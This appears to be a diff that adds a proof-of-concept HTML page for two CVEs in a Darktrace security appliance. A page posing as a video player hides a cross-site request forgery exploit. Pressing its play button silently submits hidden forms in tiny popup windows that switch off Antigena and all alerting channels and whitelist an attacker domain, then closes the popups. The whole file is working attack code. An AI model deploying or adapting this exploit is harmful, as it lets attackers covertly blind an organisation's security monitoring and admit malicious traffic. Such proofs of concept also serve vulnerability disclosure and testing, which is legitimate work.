@@ -1,0 +1,57 @@
+<html>
+
+<head>
+    <title>Darktrace POC - CVE-2019-9596 and CVE-2019-9597</title>
+    <script>
+        var myVideo;
+        var attackWindow;
+        var attackWindow2;
+
+        function playPauseAndExploit() {
+            if (myVideo.paused) {
+                attackWindow = window.open('about:blank', 'formwindow',
+                    'scrollbars=no,menubar=no,location=no,titlebar=no,height=100,width=100,resizable=no,toolbar=no,status=no');
+                attackWindow2 = window.open('about:blank', 'form2window',
+                    'scrollbars=no,menubar=no,location=no,titlebar=no,height=100,width=100,resizable=no,toolbar=no,status=no');
+                document.getElementById("disable-anti-gena").submit();
+                document.getElementById("white-list-evil-domain").submit();
+                myVideo.play();
+                setTimeout(function() {
+                    attackWindow.close();
+                    attackWindow2.close()
+                }, 1000);
+            } else {
+                myVideo.pause();
+            }
+        }
+        document.addEventListener('DOMContentLoaded', function() {
+            myVideo = document.getElementById("video1");
+        }, false);
+    </script>
+</head>
+
+<body>
+    <div style="text-align:center">
+        <button onclick="playPauseAndExploit();">Play/Pause Video</button>
+        <br>
+        <br>
+        <video id="video1" width="800">
+            <source src="<link towards video file>" type="video/mp4"> Your browser does not support HTML5 video.
+        </video>
+    </div>
+    <form id="disable-anti-gena" target="formwindow" method="post" action="<domain or ip Darktrace device>/config/">
+        <input type="hidden" name="AntigenaNetwork" value="false" />
+        <input type="hidden" name="HTTPAlerts" value="false" />
+        <input type="hidden" name="ActiveMQAlerts" value="false" />
+        <input type="hidden" name="CEFSyslogAlerts" value="false" />
+        <input type="hidden" name="EmailAlerts" value="false" />
+        <input type="hidden" name="JSONSyslogAlerts" value="false" />
+        <input type="hidden" name="LEEFSyslogAlerts" value="false" />
+        <input type="hidden" name="MobileAppAlerts" value="false" />
+    </form>
+    <form id="white-list-evil-domain" target="form2window" method="post" action="<domain or ip Darktrace device>/whitelisteddomains">
+        <input type="hidden" name="newdomain" value="www.evilhackers.com" />
+    </form>
+</body>
+
+</html>
